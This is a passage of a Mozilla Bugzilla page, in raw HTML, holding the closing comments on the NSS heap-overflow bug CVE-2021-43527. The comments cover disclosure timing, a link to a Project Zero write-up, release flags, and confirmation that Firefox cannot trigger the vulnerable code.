                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3302168_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a3302168_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 12:15 PST" data-time="1638389725">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">See Also:  &rarr; <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED INVALID - SEGV CERT_VerifyCertificate [vfychain]"
   href="/show_bug.cgi?id=1743881">1743881</a></div></div></div><div class="change-set" id="c100"><div class="comment" data-id="15679765" data-no="100"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-100" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_47192" id="a3302168_1689"><img src="https://secure.gravatar.com/avatar/5d5f37905f36ca9989f88861a702cff3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_47192" id="a3302168_1689"><a class="email " href="/user_profile?user_id=47192" > <span class="fna">Mike Hommey [:glandium]|pto until Jan 7</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-100"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-100" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c100">Comment 100</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 12:35 PST" data-time="1638390928">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-100">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-100" data-comment-id="15679765"><p>(In reply to Benjamin Beurdouche [:beurdouche] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c86" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #86</a>)</p>
<blockquote>
<p>Status update. Thanks to Dennis, the Private disclosure to the distros list has been done and they acknowledged this morning.<br>
The public disclosure is set to December 6th, 16:00 UTC.</p>
</blockquote>
<p>(In reply to Benjamin Beurdouche [:beurdouche] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c89" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #89</a>)</p>
<blockquote>
<p>Everyone should be aware already but commenting here just in case...<br>
The embargo was broken a few hours ago so - in agreement with the Linux distros list - the new public disclosure is set to: December 1st, 16:00 UTC</p>
</blockquote>
<p>What distros list, with what thread titles? I&#39;ve seen neither messages, while I should have.</p>
</div></div><div class="change-set" id="c101"><div class="comment" data-id="15679768" data-no="101"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-101" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a3302168_1689"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a3302168_1689"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-101"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-101" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c101">Comment 101</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 12:42 PST" data-time="1638391368">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-101">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-101" data-comment-id="15679768"><blockquote>
<p>What distros list, with what thread titles? I&#39;ve seen neither messages, while I should have.</p>
</blockquote>
<p>From: Dennis Jackson &lt;<a href="mailto:djackson@mozilla.com" rel="nofollow">djackson@mozilla.com</a>&gt;<br>
Date: Mon, Nov 29, 2021 at 10:00 AM<br>
Subject: [vs] <a href="https://www.cve.org/CVERecord?id=CVE-2021-43527">CVE-2021-43527</a>: Heap overflow in NSS when verifying DSA/RSA-PSS DER-encoded signatures<br>
To: &lt;<a href="mailto:distros@vs.openwall.org" rel="nofollow">distros@vs.openwall.org</a>&gt;</p>
</div></div><div class="change-set" id="c102"><div class="comment" data-id="15679907" data-no="102"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-102" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_381992" id="a3302168_1689"><img src="https://secure.gravatar.com/avatar/a430cf58452b9e73dfdde1555ad7eab3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_381992" id="a3302168_1689"><a class="email " href="/user_profile?user_id=381992" > <span class="fna">Ryan Sleevi</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-102"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-102" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c102">Comment 102</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 14:46 PST" data-time="1638398794">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-102">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-102" data-comment-id="15679907"><p>Adding the P0 write-up from Tavis at <a href="https://googleprojectzero.blogspot.com/2021/12/this-shouldnt-have-happened.html" rel="nofollow">https://googleprojectzero.blogspot.com/2021/12/this-shouldnt-have-happened.html</a></p>
</div></div><div class="change-set" id="a3823626_75935"><div class="change" id="aa3823626_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a3823626_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a3823626_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a3823626_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3823626_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a3823626_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-07 13:06 PST" data-time="1638911183">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox96&amp;o1=isnotempty">status-firefox96</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox96&amp;o1=equals&amp;v1=disabled">disabled</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox96&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">Target Milestone: --- &rarr; 3.73</div></div></div><div class="change-set" id="c103"><div class="comment" data-id="15688741" data-no="103"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-103" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_575867" id="a3823626_75935"><img src="https://secure.gravatar.com/avatar/9eb8612b118640351041fb0877c5fc8f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_575867" id="a3823626_75935"><a class="email " href="/user_profile?user_id=575867" > <span class="fna">BugBot [:suhaib / :marco/ :calixte]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-103"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-103" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c103">Comment 103</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-08 09:00 PST" data-time="1638982820">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-103">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-103" data-comment-id="15688741"><p>As part of a security bug pattern analysis, we are requesting your help with a high level analysis of this bug. It is our hope to develop static analysis (or potentially runtime/dynamic analysis) in the future to identify classes of bugs.</p>
<p>Please visit <a href="https://docs.google.com/forms/d/e/1FAIpQLSe9uRXuoMK6tRglbNL5fpXbun_oEb6_xC2zpuE_CKA_GUjrvA/viewform?usp=pp_url&amp;entry.2124261401=https%3A%2F%2Fbugzilla.mozilla.org%2Fshow_bug.cgi%3Fid%3D1737470" rel="nofollow">this google form</a> to reply.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(djackson)</div><div class="change">Whiteboard: [disclosure deadline is 2022-01-22] &rarr; [disclosure deadline is 2022-01-22][sec-survey]</div></div></div><div class="change-set" id="a4058331_551058"><div class="change" id="aa4058331_551058">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_551058" id="a4058331_551058"><img src="https://secure.gravatar.com/avatar/dc404714d45ab836d6d74306ed1ec0ce?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_551058" id="a4058331_551058"><a class="email " href="/user_profile?user_id=551058" > <span class="fna">Mihai Boldan, Desktop QA [:mboldan]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a4058331_551058"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a4058331_551058">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a4058331_551058">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-10 06:18 PST" data-time="1639145888">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: qe-verify-</div></div></div><div class="change-set" id="c104"><div class="comment" data-id="15698489" data-no="104"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-104" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_644159" id="a4058331_551058"><img src="https://secure.gravatar.com/avatar/46fbd084ad1a893caecbb3d539951e40?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_644159" id="a4058331_551058"><a class="email " href="/user_profile?user_id=644159" > <span class="fna">Dennis Jackson</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-104"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-104" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c104">Comment 104</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-15 02:43 PST" data-time="1639564990">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-104">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-104" data-comment-id="15698489"><p>Form filled out.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(djackson)</span></div></div></div><div class="change-set" id="c105"><div class="comment" data-id="15719639" data-no="105"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-105" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a4058331_551058"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a4058331_551058"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-105"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-105" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c105">Comment 105</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2022-01-05 02:01 PST" data-time="1641376910">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-105">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-105" data-comment-id="15719639"><p>Dennis: Looking at this from a perspective of writing advisories for the upcoming release of Firefox 96 and ESR 91.5. My understanding is that these releases are marked as &quot;fixed&quot; because we are taking the updated NSS version, but they are not technically affected by this security bug.</p>
<p>Is there a local / self-exploit scenario that we need to take into account though?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(djackson)</div><div class="change">Whiteboard: [disclosure deadline is 2022-01-22][sec-survey] &rarr; [disclosure deadline is 2022-01-22][sec-survey][adv-main96-][adv-ESR91.5-]</div></div></div><div class="change-set" id="c106"><div class="comment" data-id="15719765" data-no="106"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-106" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_644159" id="a4058331_551058"><img src="https://secure.gravatar.com/avatar/46fbd084ad1a893caecbb3d539951e40?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_644159" id="a4058331_551058"><a class="email " href="/user_profile?user_id=644159" > <span class="fna">Dennis Jackson</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-106"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-106" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c106">Comment 106</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2022-01-05 04:01 PST" data-time="1641384088">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-106">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-106" data-comment-id="15719765"><p>Frederik Braun:</p>
<blockquote>
<p>Is there a local / self-exploit scenario that we need to take into account though?</p>
</blockquote>
<p>Not as far as we&#39;re aware. The vulnerable code can&#39;t be triggered from Firefox.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(djackson)</span></div></div></div><div class="change-set" id="a26494208_1689"><div class="change" id="aa26494208_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a26494208_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a26494208_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a26494208_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a26494208_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a26494208_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2022-08-26 23:29 PDT" data-time="1661581765">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security-release</span></div></div></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1737470&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div>



<dialog id="att-overlay" class="readonly"
        aria-labelledby="att-overlay-title" data-attachment-count="7">
  <form method="dialog">
    <div class="header">
      <h2 id="att-overlay-title" class="title">Attachment</h2>
      <div class="spacer"></div>
      <button type="button" class="secondary iconic" hidden disabled data-action="prev"
              title="Previous Attachment" aria-keyshortcuts="ArrowLeft">
        <span class="icon" aria-hidden="true"></span>
      </button>
      <button type="button" class="secondary iconic" hidden disabled data-action="next"
              title="Next Attachment" aria-keyshortcuts="ArrowRight">
        <span class="icon" aria-hidden="true"></span>
      </button>
      <button type="button" class="secondary" data-action="toggle-details">Hide Details</button>
      <button type="button" class="secondary iconic" data-action="close" aria-label="Close">
        <span class="icon" aria-hidden="true"></span>
      </button>
    </div>
    <div class="body">
      <div class="sub-column">
        <div class="detail-pane">
          <section class="cols">
            <h3>General</h3>
            <div class="creator">
              Creator: <div class="vcard vcard_592223" ><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
            </div>
            <div>Created: <span class="created-date rel-time"></span></div>
            <div>Updated: <span class="updated-date rel-time"></span></div>
            <div>Size: <span class="file-size"></span></div>
          </section>
          <section class="cols">
            <h3>
              <label for="att-overlay-description">Description</label>
            </h3>
            <div>
              <input type="text" name="description" disabled
                     id="att-overlay-description" class="flex">
            </div>
          </section>
          <section class="cols">
            <h3>
              <label for="att-overlay-file-name">File Name</label>
            </h3>
            <div>
              <input type="text" name="filename" disabled
                     id="att-overlay-file-name" class="flex">
            </div>
          </section>
          <section class="cols">
            <h3>
              <label for="att-overlay-content-type">Content Type</label>
            </h3>
              <div>
                <input type="text" name="contenttypeentry" disabled id="att-overlay-content-type"
                       class="flex">
              </div>
          </section>
          
        </div>
      </div>
      <div class="main-column">
        <div class="preview-pane">
          <div class="preview ">
          </div>
        </div>
      </div>
    </div>
    <div class="footer">
      <button type="button" class="secondary" data-action="raw">Raw</button>
        <button type="button" class="secondary" disabled data-action="diff">Diff</button>
        <button type="button" class="secondary" disabled data-action="review"
                data-base="https://bugzilla.mozilla.org/page.cgi?id=splinter.html&amp;ignore=">Splinter Review</button>
      <div class="spacer"></div>
    </div>
  </form>
</dialog>
<link rel="stylesheet" href="/static/v20241211.1/extensions/FlagTypeComment/web/styles/ftc.css">
<script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ" src="/static/v20241211.1/extensions/FlagTypeComment/web/js/ftc.js"></script></div> 
</main> 
</div> 


</body>
</html>